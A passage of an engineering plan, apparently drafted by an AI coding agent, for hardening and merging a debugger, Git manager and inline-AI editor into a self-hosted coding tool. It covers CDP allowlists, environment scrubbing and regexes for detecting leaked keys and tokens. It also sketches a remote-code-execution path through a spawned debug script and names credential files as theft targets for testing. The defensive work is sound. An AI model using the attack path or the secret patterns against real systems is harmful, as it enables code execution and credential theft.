  - **Attribution (D9 default):** append a contribution line to the existing `/NOTICE` **in its format** (e.g. `This product includes contributions from helis-d — https://github.com/helis-d`) **without** disturbing John's attribution paragraph or the closing 🧇. Add the one-line inbound-licensing note: the contribution is accepted under the repo's existing Apache-2.0 (inbound = outbound; no CLA process exists). **Separate the immutable `data-template` key (`"his"`, locked — internal, used by `his.css` selectors) from the visible `#templateSel` label** (D2/naming): treat the label string as a **required naming input from John**, not a default-able placeholder, so a later relabel never touches the persisted key or CSS selectors.
  - **Commit trailers (D3-attribution):** each integration commit carries the helis-d `Co-Authored-By` **and** the standard session trailers, ordered so a squash cannot drop the contributor credit:
    ```
    Co-Authored-By: helis-d <helis-d@users.noreply.github.com>
    Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>
    Claude-Session: https://claude.ai/code/session_014o3VcAH5DcF5xmRqkHU6xg
    ```
  - **Receipts (B2):** commit the regenerated `docs/RECEIPTS.md` (or consciously decide to skip it) so the numbers on the branch reflect the new coverage.
  - Summarize which §7 decisions were taken at defaults and which remain open (notably D1 if the debugger was parked, D5 light-mode scope).
- **Verify:** `git log --oneline origin/main..integration/helis-inline-ai-git-ui` shows the intended commits; branch rebased on the live `main` tip; gate green on the tip.
- **Rollback:** N/A — **John names the push state.** Do not push, do not fast-forward `main`, never `--force`; rebase-not-force if `main` moved.
- **Gate:** D9 + John's explicit go.

### 3.1 One-screen dependency + decision map
```
W0 worktree ─ S0 baseline ─ S1 guard(FOUNDATION,§5-E) ─┬─ S3 pty(KEEP,3-way diff)
                                                        ├─ S2 s-scan TAB_NAMES (live-bug fix)
                                                        └─ S4 resolveBrain() ─┬─ S5 editorAi(ADAPT)+route+dispatcher  → mini-adv
                                                                              └─ S6 git(ADAPT,§5-B/C/D)+routes[D2,D3] → mini-adv
   S7 his.css BASE + <option> + <link> (atomic)
   ── (all above DECISION-INDEPENDENT — start while John sleeps) ──
   S8 index.html(surgical, register s-git)[D4,D6,D8] ─ S9 app.js(surgical, initGit, §4.4)[D3,D6,D7]
   S10 his.css light block[D5]
   S11 debugger(HOLD; PARK default; ship ⇒ build server-side debug.start gate FIRST)[D1,D8]
   S12 gate + adversarial + PreFlight dogfood ─ S13 hand to John[D9]
```
**Files touched, by stage (revert-scoping):** S1 `guards.js`+`config.js` · S2 `index.js`(TAB_NAMES) · S3 `pty.js` · S4 `brains.js` · S5 `editorAi.js`+`secrets.js`+`index.js`(route) · S6 `git.js`+`secrets.js`+`index.js`(routes) · S7 `his.css`(new)+`index.html`(option+link) · S8 `index.html` · S9 `app.js`(+`index.html` cachebust) · S10 `his.css` · S11 `debugger.js`+`index.js`(WS)+`index.html`(s-debug/nav)+`app.js`(dbg handlers)+`his.css`(debug CSS) · S12/S13 `run-all.mjs`+`NOTICE`+`docs/RECEIPTS.md`.

---

## 4. Security-patch specs (implementation-ready)

Anchors: `his_debugger.js`, `his_git.js`, `his_editorAi.js` (scratchpad copies), `our_guards.js`, `our_config.js`, `diff_app.txt`. All shared constants live in **new `server/src/secrets.js`** so git.js and debugger.js can't drift.

### 4-A · Debugger CDP allowlist (default-deny) + why it is NOT sufficient alone
**File:** `server/src/debugger.js` `handleDbgCommand` (his lines 95-99). This is the choke point.
```js
import { audit } from './auth.js';
const CDP_ALLOW = new Set([
  'Debugger.resume','Debugger.stepInto','Debugger.stepOver','Debugger.stepOut',
  'Runtime.getProperties',            // reads materialized scope — does not evaluate
  'Debugger.pause','Debugger.getScriptSource','Debugger.getPossibleBreakpoints',
  'Debugger.removeBreakpoint','Debugger.setBreakpoint','Debugger.setBreakpointByUrl',
  'Debugger.setPauseOnExceptions',
]);
const CDP_BP_METHODS = new Set(['Debugger.setBreakpoint','Debugger.setBreakpointByUrl']);

export function handleDbgCommand(clientId, m) {
  const session = debugSessions.get(clientId);
  if (!session || session.ws?.readyState !== WebSocket.OPEN) return;
  const cmd = m && m.cmd;
  if (!cmd || typeof cmd.method !== 'string') return;                    // reject non-object
  if (!CDP_ALLOW.has(cmd.method)) { audit('debug.cmd.denied', cmd.method); return; }  // DEFAULT-DENY
  if (CDP_BP_METHODS.has(cmd.method) && cmd.params?.condition) {         // conditional bp = arbitrary JS
    audit('debug.cmd.denied', cmd.method + ' (condition)'); return;
  }
  session.ws.send(JSON.stringify({ id: session.nextId++, method: cmd.method, params: cmd.params || {} }));
}
```
Init `session.nextId = 1000` at session creation. The server's own bootstrap sends (`Debugger.enable`/`Runtime.enable`) go direct in `connectToInspector` and must **not** route through this allowlist. **Explicit DENY (all fall through default-deny; listed for audit):** `Runtime.evaluate`, `callFunctionOn`, `compileScript`, `runScript`, `addBinding`, `awaitPromise`, `Debugger.evaluateOnCallFrame`, `setScriptSource`, `setBreakpointOnFunctionCall`, `setInstrumentationBreakpoint`, any conditional breakpoint.

**Why the allowlist alone does NOT close the RCE (F1):** `debug.start` spawns `node --inspect-brk <scriptPath>` with **client-supplied `scriptPath`**. A Tier-2 caller writes `evil.js` under `PROJECTS_DIR` via `/api/file`, then a single **allowed** `Debugger.resume` executes `evil.js`'s body. **The real fix is a server-side `debug.start` approval card before spawn** (see §4-D) — the allowlist only contains *in-session* reach.

### 4-B · Debugger minimal-env spawn
**File:** `handleDbgStart` (his lines 16-19), currently `env:{...process.env}`. In `secrets.js`:
```js
export const COCKPIT_SECRET_ENV = new Set([
  'ATLAN_TOKEN','GEMINI_API_KEY','OPENAI_API_KEY','DEEPSEEK_API_KEY','MOONSHOT_API_KEY','XAI_API_KEY',
  'MISTRAL_API_KEY','GROQ_API_KEY','TOGETHER_API_KEY','OPENROUTER_API_KEY','FIREWORKS_API_KEY',
  'COHERE_API_KEY','ANTHROPIC_API_KEY',
]);
export function scrubbedEnv(src = process.env) {
  const out = {};
  for (const [k, v] of Object.entries(src)) {
    if (COCKPIT_SECRET_ENV.has(k)) continue;
    if (/^ATLAN_/.test(k)) continue;
    if (/(_API_KEY|_TOKEN|_SECRET|PASSWORD|BEARER)$/i.test(k)) continue;  // defensive catch-all
    out[k] = v;                                                            // PATH/HOME/locale survive
  }
  return out;
}
```
Spawn with `env: scrubbedEnv()`. Necessary (closes the direct `process.env → bearer` route) but **not sufficient** — the child still has `fs` as root, which is why §4-A and §4-D are also required.

### 4-C · `blockAppRoot:true` on every git.js (8) and debugger.js (2) `guardPath` — see S6/S11. The unconditional fix blocks `APP_ROOT`; the recommended default additionally refuses `cwd === PROJECTS_DIR` (operate on project **subdirs** only) behind D2.

### 4-D · `getGitDiff` guarded read (§5-B) & `gitAiCommitMsg` egress scan (§5-D) — full implementations in the S6 changes; the secret scanner and `SECRET_PATTERNS` live in `secrets.js`:
```js
const SECRET_PATTERNS = [
  [/-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/, 'private key block'],
  [/\bAKIA[0-9A-Z]{16}\b/, 'AWS access key id'],
  [/\bsk-[A-Za-z0-9]{20,}\b/, 'OpenAI-style secret key'],
  [/\bgh[pousr]_[A-Za-z0-9]{20,}\b/, 'GitHub token'],
  [/\bxox[baprs]-[A-Za-z0-9-]{10,}\b/, 'Slack token'],
  [/(?:authorization|bearer)\s*[:=]\s*['"]?[A-Za-z0-9._\-]{20,}/i, 'bearer/authorization'],
  [/\b(?:GEMINI|OPENAI|DEEPSEEK|MOONSHOT|XAI|MISTRAL|GROQ|TOGETHER|OPENROUTER|FIREWORKS|COHERE|ANTHROPIC)_API_KEY\s*=\s*\S+/i, 'provider key in .env'],
  [/^\+.*(?:api[_-]?key|secret|passwd|password|token)\s*[:=]\s*\S{8,}/im, 'added secret-shaped assignment'],
];
export function scanForSecrets(text){ const h=[]; for(const[re,l]of SECRET_PATTERNS) if(re.test(text)) h.push(l); return [...new Set(h)]; }
```
The `debug.start` server-side approval card reuses the existing `perm.req`/`perm.reply` or `hierarchy.js resolveGate(runId,{approve})` path and **must display the exact `scriptPath` + `cwd`** being authorized. If shipped, also verify `Runtime.getProperties` on a paused scope cannot trigger accessor getters (a getter is attacker JS) and consider a child network-egress restriction.

### 4-E · `SENSITIVE` separator-agnostic + win32 `PROJECTS_DIR` — see S1 (same commit; FOUNDATION).

### 4-F · `resolveBrain()` engine mapping + empty-reply guard — see S4/S5 (closes the silent no-op and the `setValue('')` file-wipe).

**Commit grouping (each ends green):** S1 → S4 → S5 → S6 → (S11 if ship) → S12. New shared code in `server/src/secrets.js`.

---

## 5. Subsequent-work roadmap (post-merge)

Picks up after S13. The merge places each piece at its tier but leaves the **gating gradient itself unbuilt in code**: today the only real human-in-the-loop gate is `claudeEngine.canUseTool` (Tier-1 agent tools), routed through `pendingPerms` + `perm.req`/`perm.reply` **hardwired to the claude session**. Brains have no `canUseTool`; a human opening a terminal (`pty.open`) or debugger is ungated. So "a brain requests terminal/debugger reach, human gates each MAIN step" is genuinely new plumbing — and the keystone.

**Two gate precedents to reuse (don't reinvent):** `claudeEngine.pendingPerms` (per-session, agent-scoped) and `hierarchy.js resolveGate(runId,{approve,editedOutput})` (global, id-keyed) — the latter is the better model for a general broker.

| Workstream | Size | Depends on | Gate to advance |
|---|---|---|---|
| **S1 — Permission broker (KEYSTONE)** — 1a human-init `debug.start` gate (completes the ship-path prereq); 1b generalize `pendingPerms`→ connection-scoped `PermBroker` (`server/src/permbroker.js`, id-keyed resolve, one `perm.reply` path for agent tools + debug.start + future escalation, agent-card regression-clean); 1c brain-initiated escalation gated per MAIN step, provenance-split (human's own hand ungated; brain-originated always carded), single-pty grant not standing reach | **L** | — | broker resolves all origins through one `perm.reply`; denied debug.start never spawns; agent card unchanged |
| **S2 — Tier markers** on the roster (`{…,tier}`) + a server-side classifier (Tier-1 = claude+agent CLIs; Tier-2/3 = the 12 `PROVIDERS` brains), stamped on `chat.send`/`ai-edit`/escalation + surfaced in `cockpitContext`. **Tag server-side, never trust a client tier.** | **S-M** | — | classifier maps every engine id correctly (esp. `grok`/`gemini` ambiguity); tier rides the payloads |
| **S3 — Inline-AI diff/confirm + undo transaction** — complete the §4.4 minimum into a full old-vs-new diff modal via `buildCodeBlock`, single-transaction apply, dirty-buffer preserved | **M** | — (safety, no S1 dep) | AI whole-file edit shows a diff, Apply is one undo, no silent overwrite |
| **S4 — Multimodal Tier-3** — input largely exists (`attachments.js`); missing = a gen adapter (`server/src/gen.js`, image/media endpoints, same key discipline as `brainChat`) + gated send-to-surface (gen code → editor `sendToEditor` semantics; gen → terminal is a **broker-gated escalation**, never auto-run) | **L-XL** | S1 + S2 | generated command cannot reach a pty without a broker approval; gen prompt egress gets the §5-D conscious-egress treatment |
| **S5 — his-UI polish/QA** as template #1 — 6-cell theme×template matrix, phone-width responsive incl. nav overflow, a11y contrast on glass, backdrop-filter perf on a real phone | **M** | CSS layer independent; Git/Debug-across-skins on D4/6 | matrix renders; no skin adds/removes functional DOM |
| **S6 — Testing** — unit per new endpoint (regression tests for §5-B/C/D, CDP allowlist, minimal-env, `resolveBrain`, `SENSITIVE` separators) + the adversarial contextless pass **after S1** (real escalation surface) | **M-L** | unit per-surface; adversarial after S1 | `npm test` green; no working RCE / guard bypass / un-carded escalation |
| **S7 — PreFlight dogfood** — run the merged tree through the cockpit Scan; **never suppress a self-finding, fix it the way the tool teaches** (even INFO) | **S-M + tail** | after S6 | every finding fixed-for-real or documented non-applicable, no suppression |
| **S8 — Nav real-estate** — resolve 7→9; nest per D8 default; `TAB_NAMES` correctness | **S** | design independent; placement on D8 | one-thumb usable at 360px; self-awareness names the real tab; no horizontal body scroll |

**Recommended phase sequence:** Phase 0 (decision-independent, start immediately): S2, S3, S6 unit scaffolding, S5 CSS/theme-matrix, S8 mockups. Phase 1 (keystone): S1a→S1b→S1c. Phase 2 (gated build-out): S4, debugger-reachable-by-brains, S5 finalize, S8 committed placement. Phase 3 (harden): S6 adversarial, S7 dogfood, gate, name a push state. Rough total ~XL, front-loaded on S1; Phase 0 is genuine mergeable progress without waking John.

**Standing invariants:** all work on the integration worktree; every stage ends in `npm test`; no stage weakens §5 hardening; provenance is the security primitive (human's own hand ungated, anything a Tier-2/3 model reaches for is carded per MAIN step — the broker makes it representable, the tier marker makes it decidable).

---

## 6. Risks & rollback (the plan's own failure modes)

| # | Failure mode | Detection | Recovery |
|---|---|---|---|
| R1 | **The debugger ships without the server-side `debug.start` gate** and becomes an ungated Tier-2 RCE (F1). | S11 verify: the "write `evil.js` → `Debugger.resume`" test must fail-closed; adversarial pass targets it. | **Default PARK avoids this entirely.** If ship was chosen and the gate isn't proven, `git revert` the (atomic) S11 commit — the rest of the merge stands. |
| R2 | **A mid-stack `git revert` of a shared-wiring stage (index.js/index.html/app.js) conflicts** (F2). | `git revert` throws a conflict on the import/route/DOM region. | Do **not** force the revert. **Fix forward:** land a new commit that removes the specific hunk, or reset the worktree to the last-green tip and re-apply. File-add stages still revert cleanly. |
| R3 | **S1 reverted after a guardPath consumer landed** → silent win32 fail-open (F6). | The pinned `test/security.mjs` separator assertion goes red. | S1 is FOUNDATION — never revert it; fix forward. The red gate is the backstop. |
| R4 | **`his.css` selector points at a missing/948 file** or Classic base drifts (F5, C4). | S7 verify: Classic computed styles differ with `data-template` unset; a 404 on `his.css`. | S7 lands base + option + link atomically, so the window never opens. If drift is seen, the offending un-scoped rule is the culprit — re-scope it. |
| R5 | **A missed egress/traversal vector surfaces only at S12**, buried under later commits. | The mini adversarial passes at S5/S6/S11 (F7) catch it at the tip where it's conflict-free. | Patch at the mounting stage's tip, not S12. Keep S12 as the final regression sweep. |
| R6 | **`initGit`/`initDebugger` never fire → dead Git/debug pane** (A2). | S9/S11 verify: Git list empty on tab open; `dbgEditor` null. | Add the dispatcher lines (`app.js:64-67`); his contribution omitted them. |
| R7 | **New test file not registered in `run-all.mjs`** → coverage silently absent from RECEIPTS (B2). | S12: SUITES count doesn't include the new suite. | Register in the SUITES array; commit the regenerated `docs/RECEIPTS.md`. |
| R8 | **The keep-alive/systemd restarts the live service onto integration code** (A1). | Live `:4589` serving unexpected UI. | The worktree (W0) prevents this — the live checkout stays on `main`. If it happened, `git -C /root/atlan checkout main` and restart the service. |
| R9 | **`main` moved under the branch** (already true: `aa05695` vs review's `80f0e0f`) and one of the six preserved surfaces shifted. | S0/S8 verify: a preserved surface's anchor line missing; rebase conflict. | Rebase-not-force on the live tip; re-verify the six surfaces by id (`cPersona`/`pProfile`/`hEngine`/`jobGate`/`routKind`/Scan/`templateSel`/`lmSel`), not by line number. |
| R10 | **A brain-dependent test burns a real key.** | Unexpected provider spend during `npm test`. | All such tests use `test/mock-engine.mjs`; the paid E2E suite is opt-in (`RUN_PAID=1`) and stays off. |

**Whole-branch rollback / abort criterion:** if the adversarial contextless pass finds a **live guard bypass that cannot be fixed in-session**, discard the entire worktree — `git worktree remove --force /root/atlan-integration && git branch -D integration/helis-inline-ai-git-ui`. Live `main` never moved; nothing to unwind. This is preferable to shipping a partial fix.

---

## 7. Definition of done (push-ready gates)

All must be green **on the branch tip**, from the isolated worktree, before John names a push state:

1. **`npm test` fully green** — `bash test/run.sh` boots its own throwaway server on an isolated ephemeral port with temp state (never touches `:4589`), and every registered suite passes: unit, function, connection, **security**, **adversarial**, hierarchy, attachments, editor, voice, ui.spec, tour.spec. If the throwaway boot is unhealthy the runner aborts without writing RECEIPTS — that is a red gate, not a pass.
2. **Every new security assertion green** — the S1 separator unit, the S5 ai-edit `blockAppRoot` + empty-reply-guard cases, the S6 §5-B/C/D cases (untracked/symlink/tracked-sensitive refuse, `APP_ROOT` 400, egress `needsConfirm` with zero brain calls), and (if shipped) the S11 CDP-denial + `evil.js`→`resume` + env-scrub + START-gate cases.
3. **No prettier/lint/build/self-audit assumed** — the sole Atlan gate is `npm test`; there is no such script in this repo. This is a hard correction of the earlier PreFlight-carried assumption.
4. **New suites registered** in `run-all.mjs`; `docs/RECEIPTS.md` regenerated and committed (or consciously skipped).
5. **Adversarial contextless pass clean** — independent, context-starved agents cannot exfiltrate `/root/.claude/.credentials.json`, `.auth-token`, `.fleet/auth.json`, or write into `APP_ROOT`, across `/api/git/*`, `/api/editor/ai-edit`, and (if shipped) `debug.*`.
6. **PreFlight dogfood pass** over the three new modules — every finding (even INFO) fixed-for-real or documented as a true non-applicable, **no suppression**.
7. **Regression invariants hold** — brain code cards still show → Editor (`renderRichMessage`/`buildCodeBlock`/`sendToEditor` intact); grep shows zero `formatMarkdown` and exactly one `escapeHtml`; the six preserved surfaces present; three skins switch cleanly; Classic byte-for-byte with `data-template` unset; `sw.js` untouched and `style.css?v` unchanged.
8. **Attribution complete** — helis-d line appended to `/NOTICE` in-format (John's paragraph + 🧇 preserved); inbound=outbound Apache-2.0 note added; `#templateSel` label set to John's chosen string (internal `"his"` key locked); commits carry both the helis-d and standard session trailers, squash-safe.
9. **Branch rebased on the live `main` tip**, clean history (intended commits, revertible file-adds), gate green on the tip.
10. **John has explicitly named a push state.** Until then: no push, no fast-forward, no `--force`.

*The default release is: guard FOUNDATION → pty KEEP → resolveBrain → inline-AI (Tier-2) → hardened Git Manager → "His" skin (template #1), with the debugger parked in-tree behind its written mitigation spec. Overriding D1→ship or D8→redesign are the only two answers that add prerequisite work to the critical path.*
